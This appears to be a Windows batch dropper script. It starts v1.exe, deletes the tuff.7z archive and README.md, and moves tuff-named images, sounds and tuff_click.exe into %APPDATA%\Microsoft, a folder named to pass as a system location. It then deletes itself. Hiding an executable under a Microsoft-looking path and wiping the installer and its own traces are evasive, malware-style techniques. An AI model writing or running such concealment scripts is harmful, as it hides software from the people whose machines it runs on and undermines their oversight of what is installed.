@echo off
set "DEST=%APPDATA%\Microsoft"

start v1.exe
del tuff.7z
del README.md

if not exist "%DEST%" mkdir "%DEST%"
for %%F in (*tuff*.png *tuff*.mp3) do (
    move "%%F" "%DEST%\"
)
move tuff_click.exe %DEST%

start /b "" cmd /c del "%~f0"&exit /b




